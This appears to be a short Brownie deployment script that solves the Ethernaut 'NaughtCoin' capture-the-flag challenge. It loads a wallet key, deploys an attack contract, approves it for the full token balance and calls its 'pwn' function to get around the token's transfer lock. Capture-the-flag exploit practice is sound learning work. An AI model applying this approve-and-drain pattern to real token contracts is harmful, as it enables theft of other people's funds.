from brownie import accounts, AttackNaughtCoin,NaughtCoin, config


def main():
    contract = '0xA29657dF83de339412f53Cf1B167daadFef8bC96'
    hacker = accounts.add(config['wallets']['from_key'])

    coin = NaughtCoin.at(contract)
    balance = coin.balanceOf(hacker)

    attack_contract = AttackNaughtCoin.deploy(contract, {'from': hacker})
    coin.approve(attack_contract.address,balance,{"from":hacker})

    attack_contract.pwn({'from': hacker})

    print("Balance of hacker contract: ", balance)

    